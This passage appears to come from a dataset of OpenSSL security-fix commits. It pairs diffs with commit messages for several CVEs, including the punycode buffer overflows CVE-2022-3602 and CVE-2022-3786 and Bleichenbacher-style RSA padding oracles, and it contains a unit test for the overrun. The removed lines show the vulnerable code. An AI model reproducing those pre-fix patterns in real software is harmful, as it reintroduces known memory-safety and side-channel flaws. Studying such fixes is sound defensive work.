    message\", 7, kdk, flen * 8) < 0)\n+        goto err;\n+\n+    /* decide how long\
    \ the random message should be */\n+    if (ossl_rsa_prf(ctx, candidate_lengths,\
    \ sizeof(candidate_lengths),\n+                     \"length\", 6, kdk,\n+   \
    \                  MAX_LEN_GEN_TRIES * sizeof(len_candidate) * 8) < 0)\n+    \
    \    goto err;\n+\n+    /*\n+     * max message size is the size of the modulus\
    \ size less 2 bytes for\n+     * version and padding type and a minimum of 8 bytes\
    \ padding\n+     */\n+    len_mask = max_sep_offset = flen - 2 - 8;\n+    /*\n\
    +     * we want a mask so lets propagate the high bit to all positions less\n\
    +     * significant than it\n+     */\n+    len_mask |= len_mask >> 1;\n+    len_mask\
    \ |= len_mask >> 2;\n+    len_mask |= len_mask >> 4;\n+    len_mask |= len_mask\
    \ >> 8;\n+\n+    synthethic_length = 0;\n+    for (i = 0; i < MAX_LEN_GEN_TRIES\
    \ * (int)sizeof(len_candidate);\n+            i += sizeof(len_candidate)) {\n\
    +        len_candidate = (candidate_lengths[i] << 8) | candidate_lengths[i + 1];\n\
    +        len_candidate &= len_mask;\n+\n+        synthethic_length = constant_time_select_int(\n\
    +            constant_time_lt(len_candidate, max_sep_offset),\n+            len_candidate,\
    \ synthethic_length);\n+    }\n+\n+    synth_msg_index = flen - synthethic_length;\n\
    +\n+    /* we have alternative message ready, check the real one */\n+    good\
    \ = constant_time_is_zero(from[0]);\n+    good &= constant_time_eq(from[1], 2);\n\
    +\n+    /* then look for the padding|message separator (the first zero byte) */\n\
    +    found_zero_byte = 0;\n+    for (i = 2; i < flen; i++) {\n+        unsigned\
    \ int equals0 = constant_time_is_zero(from[i]);\n+        zero_index = constant_time_select_int(~found_zero_byte\
    \ & equals0,\n+                                              i, zero_index);\n\
    +        found_zero_byte |= equals0;\n+    }\n+\n+    /*\n+     * padding must\
    \ be at least 8 bytes long, and it starts two bytes into\n+     * |from|. If we\
    \ never found a 0-byte, then |zero_index| is 0 and the check\n+     * also fails.\n\
    +     */\n+    good &= constant_time_ge(zero_index, 2 + 8);\n+\n+    /*\n+   \
    \  * Skip the zero byte. This is incorrect if we never found a zero-byte\n+  \
    \   * but in this case we also do not copy the message out.\n+     */\n+    msg_index\
    \ = zero_index + 1;\n+\n+    /*\n+     * old code returned an error in case the\
    \ decrypted message wouldn't fit\n+     * into the |to|, since that would leak\
    \ information, return the synthethic\n+     * message instead\n+     */\n+   \
    \ good &= constant_time_ge(tlen, num - msg_index);\n+\n+    msg_index = constant_time_select_int(good,\
    \ msg_index, synth_msg_index);\n+\n+    /*\n+     * since at this point the |msg_index|\
    \ does not provide the signal\n+     * indicating if the padding check failed\
    \ or not, we don't have to worry\n+     * about leaking the length of returned\
    \ message, we still need to ensure\n+     * that we read contents of both buffers\
    \ so that cache accesses don't leak\n+     * the value of |good|\n+     */\n+\
    \    for (i = msg_index, j = 0; i < flen && j < tlen; i++, j++)\n+        to[j]\
    \ = constant_time_select_8(good, from[i], synthetic[i]);\n+    ret = j;\n+\n+err:\n\
    +    /*\n+     * the only time ret < 0 is when the ciphertext is publicly invalid\n\
    +     * or we were called with invalid parameters, so we don't have to perform\n\
    +     * a side-channel secure raising of the error\n+     */\n+    if (ret < 0)\n\
    +        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+    OPENSSL_free(synthetic);\n\
    +    return ret;\n+}\n+\n /*\n  * ossl_rsa_padding_check_PKCS1_type_2_TLS() checks\
    \ and removes the PKCS1 type 2\n  * padding from a decrypted RSA message in a\
    \ TLS signature. The result is stored"
  commit_message: 'rsa: add implicit rejection in PKCS#1 v1.5


    The RSA decryption as implemented before required very careful handling

    of both the exit code returned by OpenSSL and the potentially returned

    ciphertext. Looking at the recent security vulnerabilities

    (CVE-2020-25659 and CVE-2020-25657) it is unlikely that most users of

    OpenSSL do it correctly.


    Given that correct code requires side channel secure programming in

    application code, we can classify the existing RSA decryption methods

    as CWE-676, which in turn likely causes CWE-208 and CWE-385 in

    application code.


    To prevent that, we can use a technique called "implicit rejection".

    For that we generate a random message to be returned in case the

    padding check fails. We generate the message based on static secret

    data (the private exponent) and the provided ciphertext (so that the

    attacker cannot determine that the returned value is randomly generated

    instead of result of decryption and de-padding). We return it in case

    any part of padding check fails.


    The upshot of this approach is that then not only is the length of the

    returned message useless as the Bleichenbacher oracle, so are the

    actual bytes of the returned message. So application code doesn''t have

    to perform any operations on the returned message in side-channel free

    way to remain secure against Bleichenbacher attacks.


    Note: this patch implements a specific algorithm, shared with Mozilla

    NSS, so that the attacker cannot use one library as an oracle against the

    other in heterogeneous environments.


    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Tim Hudson <tjh@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/13817)'
  commit_sha: 7fc67e0a33102aa47bbaa56533eeecb98c0450f7
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/pcy_map.c\n+++ b/crypto/x509/pcy_map.c\n@@ -73,10 +73,6 @@\
    \ int ossl_policy_cache_set_mapping(X509 *x, POLICY_MAPPINGS *maps)\n \n     ret\
    \ = 1;\n  bad_mapping:\n-    if (ret == -1 && CRYPTO_THREAD_write_lock(x->lock))\
    \ {\n-        x->ex_flags |= EXFLAG_INVALID_POLICY;\n-        CRYPTO_THREAD_unlock(x->lock);\n\
    -    }\n     sk_POLICY_MAPPING_pop_free(maps, POLICY_MAPPING_free);\n     return\
    \ ret;\n "
  commit_message: 'x509: fix double locking problem


    This reverts commit 9aa4be691f5c73eb3c68606d824c104550c053f7 and removed the

    redundant flag setting.


    Fixes #19643


    Fixes LOW CVE-2022-3996


    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19652)'
  commit_sha: 4d0340a6d2f327700a059f0b8f954d6160f8eef5
  repo_name: openssl/openssl
- commit_diff:
  - '--- a/test/punycode_test.c

    +++ b/test/punycode_test.c

    @@ -0,0 +1,220 @@

    +/*

    + * Copyright 2022 The OpenSSL Project Authors. All Rights Reserved.

    + *

    + * Licensed under the Apache License 2.0 (the "License").  You may not use

    + * this file except in compliance with the License.  You can obtain a copy

    + * in the file LICENSE in the source distribution or at

    + * https://www.openssl.org/source/license.html

    + */

    +

    +#include <openssl/crypto.h>

    +#include <string.h>

    +

    +#include "crypto/punycode.h"

    +#include "internal/nelem.h"

    +#include "testutil.h"

    +

    +

    +static const struct puny_test {

    +    unsigned int raw[50];

    +    const char *encoded;

    +} puny_cases[] = {

    +    /* Test cases from RFC 3492 */

    +    {   /* Arabic (Egyptian) */

    +        { 0x0644, 0x064A, 0x0647, 0x0645, 0x0627, 0x0628, 0x062A, 0x0643, 0x0644,

    +          0x0645, 0x0648, 0x0634, 0x0639, 0x0631, 0x0628, 0x064A, 0x061F

    +        },

    +        "egbpdaj6bu4bxfgehfvwxn"

    +    },

    +    {   /* Chinese (simplified) */

    +        { 0x4ED6, 0x4EEC, 0x4E3A, 0x4EC0, 0x4E48, 0x4E0D, 0x8BF4, 0x4E2D, 0x6587

    +        },

    +        "ihqwcrb4cv8a8dqg056pqjye"

    +    },

    +    {   /* Chinese (traditional) */

    +        { 0x4ED6, 0x5011, 0x7232, 0x4EC0, 0x9EBD, 0x4E0D, 0x8AAA, 0x4E2D, 0x6587

    +        },

    +        "ihqwctvzc91f659drss3x8bo0yb"

    +    },

    +    {    /* Czech: Pro<ccaron>prost<ecaron>nemluv<iacute><ccaron>esky */

    +        { 0x0050, 0x0072, 0x006F, 0x010D, 0x0070, 0x0072, 0x006F, 0x0073, 0x0074,

    +          0x011B, 0x006E, 0x0065, 0x006D, 0x006C, 0x0075, 0x0076, 0x00ED, 0x010D,

    +          0x0065, 0x0073, 0x006B, 0x0079

    +       },

    +        "Proprostnemluvesky-uyb24dma41a"

    +    },

    +    {   /* Hebrew */

    +        { 0x05DC, 0x05DE, 0x05D4, 0x05D4, 0x05DD, 0x05E4, 0x05E9, 0x05D5, 0x05D8,

    +          0x05DC, 0x05D0, 0x05DE, 0x05D3, 0x05D1, 0x05E8, 0x05D9, 0x05DD, 0x05E2,

    +          0x05D1, 0x05E8, 0x05D9, 0x05EA

    +        },

    +        "4dbcagdahymbxekheh6e0a7fei0b"

    +    },

    +    {   /* Hindi (Devanagari) */

    +        { 0x092F, 0x0939, 0x0932, 0x094B, 0x0917, 0x0939, 0x093F, 0x0928, 0x094D,

    +          0x0926, 0x0940, 0x0915, 0x094D, 0x092F, 0x094B, 0x0902, 0x0928, 0x0939,

    +          0x0940, 0x0902, 0x092C, 0x094B, 0x0932, 0x0938, 0x0915, 0x0924, 0x0947,

    +          0x0939, 0x0948, 0x0902

    +        },

    +        "i1baa7eci9glrd9b2ae1bj0hfcgg6iyaf8o0a1dig0cd"

    +    },

    +    {   /* Japanese (kanji and hiragana) */

    +        { 0x306A, 0x305C, 0x307F, 0x3093, 0x306A, 0x65E5, 0x672C, 0x8A9E, 0x3092,

    +          0x8A71, 0x3057, 0x3066, 0x304F, 0x308C, 0x306A, 0x3044, 0x306E, 0x304B

    +        },

    +        "n8jok5ay5dzabd5bym9f0cm5685rrjetr6pdxa"

    +    },

    +    {   /* Korean (Hangul syllables) */

    +        { 0xC138, 0xACC4, 0xC758, 0xBAA8, 0xB4E0, 0xC0AC, 0xB78C, 0xB4E4, 0xC774,

    +          0xD55C, 0xAD6D, 0xC5B4, 0xB97C, 0xC774, 0xD574, 0xD55C, 0xB2E4, 0xBA74,

    +          0xC5BC, 0xB9C8, 0xB098, 0xC88B, 0xC744, 0xAE4C

    +        },

    +        "989aomsvi5e83db1d2a355cv1e0vak1dwrv93d5xbh15a0dt30a5jpsd879ccm6fea98c"

    +    },

    +    {   /* Russian (Cyrillic) */

    +        { 0x043F, 0x043E, 0x0447, 0x0435, 0x043C, 0x0443, 0x0436, 0x0435, 0x043E,

    +          0x043D, 0x0438, 0x043D, 0x0435, 0x0433, 0x043E, 0x0432, 0x043E, 0x0440,

    +          0x044F, 0x0442, 0x043F, 0x043E, 0x0440, 0x0443, 0x0441, 0x0441, 0x043A,

    +          0x0438

    +        },

    +        "b1abfaaepdrnnbgefbaDotcwatmq2g4l"

    +    },

    +    {   /* Spanish */

    +        { 0x0050, 0x006F, 0x0072, 0x0071, 0x0075, 0x00E9, 0x006E, 0x006F, 0x0070,

    +          0x0075, 0x0065, 0x0064, 0x0065, 0x006E, 0x0073, 0x0069, 0x006D, 0x0070,

    +          0x006C, 0x0065, 0x006D, 0x0065, 0x006E, 0x0074, 0x0065, 0x0068, 0x0061,

    +          0x0062, 0x006C, 0x0061, 0x0072, 0x0065, 0x006E, 0x0045, 0x0073, 0x0070,

    +          0x0061, 0x00F1, 0x006F, 0x006C

    +        },

    +        "PorqunopuedensimplementehablarenEspaol-fmd56a"

    +    },

    +    {   /* Vietnamese */

    +        { 0x0054, 0x1EA1, 0x0069, 0x0073, 0x0061, 0x006F, 0x0068, 0x1ECD, 0x006B,

    +          0x0068, 0x00F4, 0x006E, 0x0067, 0x0074, 0x0068, 0x1EC3, 0x0063, 0x0068,

    +          0x1EC9, 0x006E, 0x00F3, 0x0069, 0x0074, 0x0069, 0x1EBF, 0x006E, 0x0067,

    +          0x0056, 0x0069, 0x1EC7, 0x0074

    +        },

    +        "TisaohkhngthchnitingVit-kjcr8268qyxafd2f1b9g"

    +    },

    +    {   /* Japanese: 3<nen>B<gumi><kinpachi><sensei> */

    +        { 0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, 0x751F

    +        },

    +        "3B-ww4c5e180e575a65lsy2b"

    +    },

    +    {   /* Japanese: <amuro><namie>-with-SUPER-MONKEYS */

    +        { 0x5B89, 0x5BA4, 0x5948, 0x7F8E, 0x6075, 0x002D, 0x0077, 0x0069, 0x0074,

    +          0x0068, 0x002D, 0x0053, 0x0055, 0x0050, 0x0045, 0x0052, 0x002D, 0x004D,

    +          0x004F, 0x004E, 0x004B, 0x0045, 0x0059, 0x0053

    +        },

    +        "-with-SUPER-MONKEYS-pc58ag80a8qai00g7n9n"

    +    },

    +    {   /* Japanese: Hello-Another-Way-<sorezore><no><basho> */

    +        { 0x0048, 0x0065, 0x006C, 0x006C, 0x006F, 0x002D, 0x0041, 0x006E, 0x006F,

    +          0x0074, 0x0068, 0x0065, 0x0072, 0x002D, 0x0057, 0x0061, 0x0079, 0x002D,

    +          0x305D, 0x308C, 0x305E, 0x308C, 0x306E, 0x5834, 0x6240

    +        },

    +        "Hello-Another-Way--fc4qua05auwb3674vfr0b"

    +    },

    +    {   /* Japanese: <hitotsu><yane><no><shita>2 */

    +        { 0x3072, 0x3068, 0x3064, 0x5C4B, 0x6839, 0x306E, 0x4E0B, 0x0032

    +        },

    +        "2-u9tlzr9756bt3uc0v"

    +    },

    +    {   /* Japanese: Maji<de>Koi<suru>5<byou><mae> */

    +        { 0x004D, 0x0061, 0x006A, 0x0069, 0x3067, 0x004B, 0x006F, 0x0069, 0x3059,

    +          0x308B, 0x0035, 0x79D2, 0x524D

    +        },

    +        "MajiKoi5-783gue6qz075azm5e"

    +    },

    +    {   /* Japanese: <pafii>de<runba> */

    +        { 0x30D1, 0x30D5, 0x30A3, 0x30FC, 0x0064, 0x0065, 0x30EB, 0x30F3, 0x30D0

    +        },

    +        "de-jg4avhby1noc0d"

    +    },

    +    {   /* Japanese: <sono><supiido><de> */

    +        { 0x305D, 0x306E, 0x30B9, 0x30D4, 0x30FC, 0x30C9, 0x3067

    +        },

    +        "d9juau41awczczp"

    +    },

    +    {   /* -> $1.00 <- */

    +        { 0x002D, 0x003E, 0x0020, 0x0024, 0x0031, 0x002E, 0x0030, 0x0030, 0x0020,

    +          0x003C, 0x002D

    +        },

    +        "-> $1.00 <--"

    +    }

    +};

    +

    +static int test_punycode(int n)

    +{

    +    const struct puny_test *tc = puny_cases + n;

    +    unsigned int buffer[50];

    +    unsigned int bsize = OSSL_NELEM(buffer);

    +    size_t i;

    +

    +    if (!TEST_true(ossl_punycode_decode(tc->encoded, strlen(tc->encoded),

    +                                        buffer, &bsize)))

    +        return 0;

    +    for (i = 0; i < sizeof(tc->raw); i++)

    +        if (tc->raw[i] == 0)

    +            break;

    +    if (!TEST_mem_eq(buffer, bsize * sizeof(*buffer),

    +                     tc->raw, i * sizeof(*tc->raw)))

    +        return 0;

    +    return 1;

    +}

    +

    +static int test_a2ulabel(void)

    +{

    +    char out[50];

    +    size_t outlen;

    +

    +    /*

    +     * Test that no buffer correctly returns the true length.

    +     * The punycode being passed in and parsed is malformed but we''re not

    +     * verifying that behaviour here.

    +     */

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", NULL, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1))

    +        return 0;

    +    /* Test that a short input length returns the true length */

    +    outlen = 1;

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1)

    +            || !TEST_str_eq(out,"\xc2\x80.b.c"))

    +        return 0;

    +    /* Test for an off by one on the buffer size works */

    +    outlen = 6;

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1)

    +            || !TEST_str_eq(out,"\xc2\x80.b.c"))

    +        return 0;

    +    return 1;

    +}

    +

    +static int test_puny_overrun(void)

    +{

    +    static const unsigned int out[] = {

    +        0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, 0x751F

    +    };

    +    static const char *in = "3B-ww4c5e180e575a65lsy2b";

    +    unsigned int buf[OSSL_NELEM(out)];

    +    unsigned int bsize = OSSL_NELEM(buf) - 1;

    +

    +    if (!TEST_false(ossl_punycode_decode(in, strlen(in), buf, &bsize))) {

    +        if (TEST_mem_eq(buf, bsize * sizeof(*buf), out, sizeof(out)))

    +            TEST_error("CRITICAL: buffer overrun detected!");

    +        return 0;

    +    }

    +    return 1;

    +}

    +

    +int setup_tests(void)

    +{

    +    ADD_ALL_TESTS(test_punycode, OSSL_NELEM(puny_cases));

    +    ADD_TEST(test_a2ulabel);

    +    ADD_TEST(test_puny_overrun);

    +    return 1;

    +}'
  commit_message: 'punycode: add unit tests


    These tests verify basic functionality and specifically test for

    CVE-2022-3602.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit f0f530216bf93e9cdc9c2c9e3c095229d216da15)'
  commit_sha: a0af4a3c8b18c435a5a4afb28b3ad1a2730e6ea8
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/punycode.c\n+++ b/crypto/punycode.c\n@@ -185,7 +184,7 @@ int ossl_punycode_decode(const\
    \ char *pEncoded, const size_t enc_len,\n             return 0;\n \n         memmove(pDecoded\
    \ + i + 1, pDecoded + i,\n-                (written_out - i) * sizeof *pDecoded);\n\
    +                (written_out - i) * sizeof(*pDecoded));\n         pDecoded[i]\
    \ = n;\n         i++;\n         written_out++;\n@@ -255,65 +254,61 @@ int ossl_a2ulabel(const\
    \ char *in, char *out, size_t *outlen)\n      */\n     char *outptr = out;\n \
    \    const char *inptr = in;\n-    size_t size = 0;\n+    size_t size = 0, maxsize;\n\
    \     int result = 1;\n-\n+    unsigned int i, j;\n     unsigned int buf[LABEL_BUF_SIZE];\
    \      /* It's a hostname */\n-    if (out == NULL)\n+\n+    if (out == NULL)\
    \ {\n         result = 0;\n+        maxsize = 0;\n+    } else {\n+        maxsize\
    \ = *outlen;\n+    }\n+\n+#define PUSHC(c)                    \\\n+    do    \
    \                          \\\n+        if (size++ < maxsize)       \\\n+    \
    \        *outptr++ = c;          \\\n+        else                        \\\n\
    +            result = 0;             \\\n+    while (0)\n \n     while (1) {\n\
    \         char *tmpptr = strchr(inptr, '.');\n-        size_t delta = (tmpptr)\
    \ ? (size_t)(tmpptr - inptr) : strlen(inptr);\n+        size_t delta = tmpptr\
    \ != NULL ? (size_t)(tmpptr - inptr) : strlen(inptr);\n \n         if (!HAS_PREFIX(inptr,\
    \ \"xn--\")) {\n-            size += delta + 1;\n-\n-            if (size >= *outlen\
    \ - 1)\n-                result = 0;\n-\n-            if (result > 0) {\n-   \
    \             memcpy(outptr, inptr, delta + 1);\n-                outptr += delta\
    \ + 1;\n-            }\n+            for (i = 0; i < delta + 1; i++)\n+      \
    \          PUSHC(inptr[i]);\n         } else {\n             unsigned int bufsize\
    \ = LABEL_BUF_SIZE;\n-            unsigned int i;\n \n             if (ossl_punycode_decode(inptr\
    \ + 4, delta - 4, buf, &bufsize) <= 0)\n                 return -1;\n \n     \
    \        for (i = 0; i < bufsize; i++) {\n                 unsigned char seed[6];\n\
    \                 size_t utfsize = codepoint2utf8(seed, buf[i]);\n+\n        \
    \         if (utfsize == 0)\n                     return -1;\n \n-           \
    \     size += utfsize;\n-                if (size >= *outlen - 1)\n-         \
    \           result = 0;\n-\n-                if (result > 0) {\n-            \
    \        memcpy(outptr, seed, utfsize);\n-                    outptr += utfsize;\n\
    -                }\n+                for (j = 0; j < utfsize; j++)\n+        \
    \            PUSHC(seed[j]);\n             }\n \n-            if (tmpptr != NULL)\
    \ {\n-                *outptr = '.';\n-                outptr++;\n-          \
    \      size++;\n-                if (size >= *outlen - 1)\n-                 \
    \   result = 0;\n-            }\n+            PUSHC(tmpptr != NULL ? '.' : '\\\
    0');\n         }\n \n         if (tmpptr == NULL)\n             break;\n \n  \
    \       inptr = tmpptr + 1;\n     }\n+#undef PUSHC\n \n+    *outlen = size;\n\
    \     return result;\n }\n \n@@ -327,12 +322,11 @@ int ossl_a2ulabel(const char\
    \ *in, char *out, size_t *outlen)\n \n int ossl_a2ucompare(const char *a, const\
    \ char *u)\n {\n-    char a_ulabel[LABEL_BUF_SIZE];\n+    char a_ulabel[LABEL_BUF_SIZE\
    \ + 1];\n     size_t a_size = sizeof(a_ulabel);\n \n-    if (ossl_a2ulabel(a,\
    \ a_ulabel, &a_size) <= 0) {\n+    if (ossl_a2ulabel(a, a_ulabel, &a_size) <=\
    \ 0)\n         return -1;\n-    }\n \n-    return (strcmp(a_ulabel, u) == 0) ?\
    \ 0 : 1;\n+    return strcmp(a_ulabel, u) != 0;\n }"
  commit_message: 'Fix CVE-2022-3786 in punycode decoder.


    Fixed the ossl_a2ulabel() function which also contained a potential

    buffer overflow, albeit without control of the contents.

    This overflow could result in a crash (causing a denial of service).


    The function also did not NUL-terminate the output in some cases.


    The two issues fixed here were dentified and reported

    by Viktor Dukhovni while researching CVE-2022-3602.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit c42165b5706e42f67ef8ef4c351a9a4c5d21639a)'
  commit_sha: 680e65b94c916af259bfdc2e25f1ab6e0c7a97d6
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/punycode.c\n+++ b/crypto/punycode.c\n@@ -181,7 +181,7 @@ int ossl_punycode_decode(const\
    \ char *pEncoded, const size_t enc_len,\n         n = n + i / (written_out + 1);\n\
    \         i %= (written_out + 1);\n \n-        if (written_out > max_out)\n+ \
    \       if (written_out >= max_out)\n             return 0;\n \n         memmove(pDecoded\
    \ + i + 1, pDecoded + i,"
  commit_message: 'Fix CVE-2022-3602 in punycode decoder.


    An off by one error in the punycode decoder allowed for a single unsigned int

    overwrite of a buffer which could cause a crash and possible code execution.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit fe3b639dc19b325846f4f6801f2f4604f56e3de3)'
  commit_sha: 3b421ebc64c7b52f1b9feb3812bdc7781c784332
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/digest.c\n+++ b/crypto/evp/digest.c\n@@ -230,11 +230,12 @@ static\
    \ int evp_md_init_internal(EVP_MD_CTX *ctx, const EVP_MD *type,\n # endif\n #endif\n\
    \             || (ctx->flags & EVP_MD_CTX_FLAG_NO_INIT) != 0\n-            ||\
    \ type->origin == EVP_ORIG_METH) {\n+            || (type != NULL && type->origin\
    \ == EVP_ORIG_METH)\n+            || (type == NULL && ctx->digest != NULL\n+ \
    \                            && ctx->digest->origin == EVP_ORIG_METH)) {\n   \
    \      /* If we were using provided hash before, cleanup algctx */\n         if\
    \ (!evp_md_ctx_free_algctx(ctx))\n             return 0;\n-\n         if (ctx->digest\
    \ == ctx->fetched_digest)\n             ctx->digest = NULL;\n         EVP_MD_free(ctx->fetched_digest);"
  - "--- a/crypto/evp/evp_enc.c\n+++ b/crypto/evp/evp_enc.c\n@@ -144,7 +144,10 @@\
    \ static int evp_cipher_init_internal(EVP_CIPHER_CTX *ctx,\n #if !defined(OPENSSL_NO_ENGINE)\
    \ && !defined(FIPS_MODULE)\n             || tmpimpl != NULL\n #endif\n-      \
    \      || impl != NULL) {\n+            || impl != NULL\n+            || (cipher\
    \ != NULL && cipher->origin == EVP_ORIG_METH)\n+            || (cipher == NULL\
    \ && ctx->cipher != NULL\n+                               && ctx->cipher->origin\
    \ == EVP_ORIG_METH)) {\n         if (ctx->cipher == ctx->fetched_cipher)\n   \
    \          ctx->cipher = NULL;\n         EVP_CIPHER_free(ctx->fetched_cipher);"
  commit_message: 'Fix usage of custom EVP_CIPHER objects


    If a custom EVP_CIPHER object has been passed to EVP_CipherInit() then it

    should be used in preference to a fetched cipher.


    We also fix a possible NULL pointer deref in the same code for digests.


    If the custom cipher passed to EVP_CipherInit() happens to use NID_undef

    (which should be a discouraged practice), then in the previous

    implementation this could result in the NULL cipher being fetched and

    hence NULL encryption being unexpectedly used.


    CVE-2022-3358


    Fixes #18970


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19300)'
  commit_sha: 25d47cccf203c3b71171e78865e48ea061a039a8
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/statem/statem_clnt.c\n+++ b/ssl/statem/statem_clnt.c\n@@ -3156,7 +3156,8\
    \ @@ static int tls_construct_cke_gost18(SSL *s, WPACKET *pkt)\n {\n #ifndef OPENSSL_NO_GOST\n\
    \     /* GOST 2018 key exchange message creation */\n-    unsigned char rnd_dgst[32],\
    \ tmp[255];\n+    unsigned char rnd_dgst[32];\n+    unsigned char *encdata = NULL;\n\
    \     EVP_PKEY_CTX *pkey_ctx = NULL;\n     X509 *peer_cert;\n     unsigned char\
    \ *pms = NULL;\n@@ -3221,18 +3222,19 @@ static int tls_construct_cke_gost18(SSL\
    \ *s, WPACKET *pkt)\n         goto err;\n     }\n \n-    msglen = 255;\n-    if\
    \ (EVP_PKEY_encrypt(pkey_ctx, tmp, &msglen, pms, pmslen) <= 0) {\n-        SSLfatal(s,\
    \ SSL_AD_INTERNAL_ERROR, SSL_R_LIBRARY_BUG);\n+    if (EVP_PKEY_encrypt(pkey_ctx,\
    \ NULL, &msglen, pms, pmslen) <= 0) {\n+        SSLfatal(s, SSL_AD_INTERNAL_ERROR,\
    \ ERR_R_EVP_LIB);\n         goto err;\n     }\n \n-    if (!WPACKET_memcpy(pkt,\
    \ tmp, msglen)) {\n-        SSLfatal(s, SSL_AD_INTERNAL_ERROR, ERR_R_INTERNAL_ERROR);\n\
    +    if (!WPACKET_allocate_bytes(pkt, msglen, &encdata)\n+            || EVP_PKEY_encrypt(pkey_ctx,\
    \ encdata, &msglen, pms, pmslen) <= 0) {\n+        SSLfatal(s, SSL_AD_INTERNAL_ERROR,\
    \ ERR_R_EVP_LIB);\n         goto err;\n     }\n \n     EVP_PKEY_CTX_free(pkey_ctx);\n\
    +    pkey_ctx = NULL;\n     s->s3.tmp.pms = pms;\n     s->s3.tmp.pmslen = pmslen;\n\
    \ "
  commit_message: 'Use safe pattern for buffer size determining in case of GOST key
    exchange


    Related: CVE-2022-29242


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/18381)'
  commit_sha: 2b5e89992e3ada1131beebb2a22722168b9389c2
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/ciphers/cipher_rc4_hmac_md5.c\n+++ b/providers/implementations/ciphers/cipher_rc4_hmac_md5.c\n\
    @@ -183,7 +183,7 @@ static int rc4_hmac_md5_set_ctx_params(void *vctx, const OSSL_PARAM\
    \ params[])\n         }\n         ctx->tls_aad_pad_sz = sz;\n     }\n-    p =\
    \ OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_AEAD_TLS1_AAD);\n+    p =\
    \ OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_AEAD_MAC_KEY);\n     if (p\
    \ != NULL) {\n         if (p->data_type != OSSL_PARAM_OCTET_STRING) {\n      \
    \       ERR_raise(ERR_LIB_PROV, PROV_R_FAILED_TO_GET_PARAMETER);"
  commit_message: 'Fix the RC4-MD5 cipher


    A copy&paste error meant that the RC4-MD5 cipher (used in TLS) used the TLS

    AAD data as the MAC key.


    CVE-2022-1434


    Fixes #18112


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 33219939c782cf363b30e9e899b9997fb1ced440
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ocsp/ocsp_vfy.c\n+++ b/crypto/ocsp/ocsp_vfy.c\n@@ -59,9 +59,10 @@\
    \ static int ocsp_verify_signer(X509 *signer, int response,\n \n     ret = X509_verify_cert(ctx);\n\
    \     if (ret <= 0) {\n-        ret = X509_STORE_CTX_get_error(ctx);\n+      \
    \  int err = X509_STORE_CTX_get_error(ctx);\n+\n         ERR_raise_data(ERR_LIB_OCSP,\
    \ OCSP_R_CERTIFICATE_VERIFY_ERROR,\n-                       \"Verify error: %s\"\
    , X509_verify_cert_error_string(ret));\n+                       \"Verify error:\
    \ %s\", X509_verify_cert_error_string(err));\n         goto end;\n     }\n   \
    \  if (chain != NULL)"
  commit_message: 'Fix OCSP_basic_verify signer certificate validation


    The function `OCSP_basic_verify` validates the signer certificate on an OCSP

    response. The internal function, ocsp_verify_signer, is responsible for this

    and is expected to return a 0 value in the event of a failure to verify.

    Unfortunately, due to a bug, it actually returns with a postive success

    response in this case. In the normal course of events OCSP_basic_verify

    will then continue and will fail anyway in the ocsp_check_issuer function

    because the supplied "chain" value will be empty in the case that

    ocsp_verify_signer failed to verify the chain. This will cause

    OCSP_basic_verify to return with a negative result (fatal error). Normally

    in the event of a failure to verify it should return with 0.


    However, in the case of the OCSP_NOCHECKS flag being used, OCSP_basic_verify

    will return with a positvie result. This could lead to callers trusting an

    OCSP Basic response when it should not be.


    CVE-2022-1343


    Fixes #18053


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 21f89f542d745adbf1131338929ae538e200d50d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_sqrt.c\n+++ b/crypto/bn/bn_sqrt.c\n@@ -14,7 +14,8 @@ BIGNUM\
